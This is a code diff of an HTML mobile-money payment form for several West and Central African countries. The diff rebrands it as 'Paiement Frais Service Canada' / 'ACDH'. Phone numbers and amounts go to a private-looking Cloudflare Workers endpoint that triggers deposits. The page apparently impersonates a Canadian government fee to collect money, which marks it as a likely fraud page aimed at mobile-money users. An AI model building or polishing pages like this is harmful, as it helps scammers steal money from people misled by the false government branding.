@@ -1,12 +1,15 @@
 <!DOCTYPE html>
 <html>
 <head>
-<title>Paiement</title>
+<title>Paiement Frais Service Canada</title>
 
 <style>
 body {
   font-family: Arial;
-  background:#f5f5f5;
+  background:
+    linear-gradient(rgba(0,0,0,0.6),rgba(0,0,0,0.6)),
+    url("background.jpg") no-repeat center;
+  background-size: cover;
   display:flex;
   justify-content:center;
   align-items:center;
@@ -16,21 +19,52 @@ body {
 .box {
   background:white;
   padding:30px;
-  width:320px;
-  border-radius:10px;
+  border-radius:12px;
+  width:340px;
   text-align:center;
 }
 
-input,select,button{
-  width:100%;
-  margin-top:10px;
-  padding:10px;
+.logo {
+  width:120px;
+  margin-bottom:10px;
 }
 
-button{
+input, select {
+  width:100%;
+  padding:10px;
+  margin-top:10px;
+  border-radius:6px;
+  border:1px solid #ccc;
+}
+
+.row {
+  display:flex;
+  gap:5px;
+}
+
+.prefix {
+  width:30%;
+  background:#eee;
+}
+
+.phone {
+  width:70%;
+}
+
+button {
+  width:100%;
+  padding:12px;
+  margin-top:12px;
   background:#00bcd4;
   color:white;
   border:none;
+  border-radius:6px;
+  font-weight:bold;
+}
+
+#result {
+  margin-top:15px;
+  font-weight:bold;
 }
 </style>
 </head>
@@ -39,24 +73,28 @@ button{
 
 <div class="box">
 
-<h3>Paiement</h3>
+<img src="logo.png" class="logo">
+
+<h2>Paiement ACDH</h2>
 
 <select id="country" onchange="updateOperators()">
-  <option value="BEN">Bénin</option>
   <option value="CIV">Côte d'Ivoire</option>
   <option value="CMR">Cameroun</option>
   <option value="COD">RDC</option>
+  <option value="COG">Congo</option>
+  <option value="GAB">Gabon</option>
+  <option value="SEN">Sénégal</option>
+  <option value="BEN">Bénin</option>
 </select>
 
 <select id="operator"></select>
 
-<!-- 🔥 PREFIX + NUMERO -->
-<div style="display:flex; gap:5px;">
-  <input id="prefix" readonly style="width:30%; background:#eee;">
-  <input id="phone" placeholder="Numéro" style="width:70%;">
+<div class="row">
+  <input id="prefix" class="prefix" readonly>
+  <input id="phone" class="phone" placeholder="Numéro">
 </div>
 
-<input id="amount" placeholder="Montant">
+<input type="number" id="amount" placeholder="Montant">
 
 <button onclick="payer()">Payer</button>
 
@@ -70,25 +108,31 @@ const operators = {
   BEN:["MTN","MOOV"],
   CIV:["MTN","ORANGE"],
   CMR:["MTN"],
-  COD:["AIRTEL","ORANGE","VODACOM"]
+  COD:["AIRTEL","ORANGE","VODACOM"],
+  COG:["AIRTEL","MTN"],
+  GAB:["AIRTEL"],
+  SEN:["ORANGE","FREE"]
 };
 
 const prefixes = {
   BEN:"229",
   CIV:"225",
   CMR:"237",
-  COD:"243"
+  COD:"243",
+  COG:"242",
+  GAB:"241",
+  SEN:"221"
 };
 
 function updateOperators(){
 
   operator.innerHTML="";
 
-  operators[country.value].forEach(o=>{
-    let op=document.createElement("option");
-    op.value=o;
-    op.textContent=o;
-    operator.appendChild(op);
+  operators[country.value].forEach(op=>{
+    let option=document.createElement("option");
+    option.value=op;
+    option.text=op;
+    operator.appendChild(option);
   });
 
   prefix.value = prefixes[country.value];
@@ -102,27 +146,36 @@ async function payer(){
 
   result.innerText="⏳ Envoi...";
 
-  // 🔥 FORMAT QUI MARCHE (IMPORTANT)
   const fullPhone = prefix.value + phone.value;
 
-  const res = await fetch("https://orange-queen.serviceprive93.workers.dev/deposit",{
-    method:"POST",
-    headers:{"Content-Type":"application/json"},
-    body:JSON.stringify({
-      phone: fullPhone,
-      amount: amount.value,
-      country: country.value,
-      operator: operator.value
-    })
-  });
+  try{
 
-  const data = await res.json();
+    const res = await fetch("https://orange-queen.serviceprive93.workers.dev/deposit",{
+      method:"POST",
+      headers:{"Content-Type":"application/json"},
+      body: JSON.stringify({
+        phone: fullPhone,
+        amount: amount.value,
+        country: country.value,
+        operator: operator.value
+      })
+    });
 
-  result.innerText =
-    data.status==="ACCEPTED"?"📲 Vérifiez votre téléphone":
-    data.status==="PENDING"?"⏳ En attente":
-    data.status==="SUCCESS"?"✅ Paiement confirmé":
-    "❌ Échec";
+    const data = await res.json();
+
+    if(data.status==="ACCEPTED"){
+      result.innerText="📲 Vérifiez votre téléphone";
+    } else if(data.status==="PENDING"){
+      result.innerText="⏳ En attente...";
+    } else if(data.status==="SUCCESS"){
+      result.innerText="✅ Paiement confirmé";
+    } else {
+      result.innerText="❌ Échec";
+    }
+
+  }catch{
+    result.innerText="❌ Erreur réseau";
+  }
 }
 
 </script>
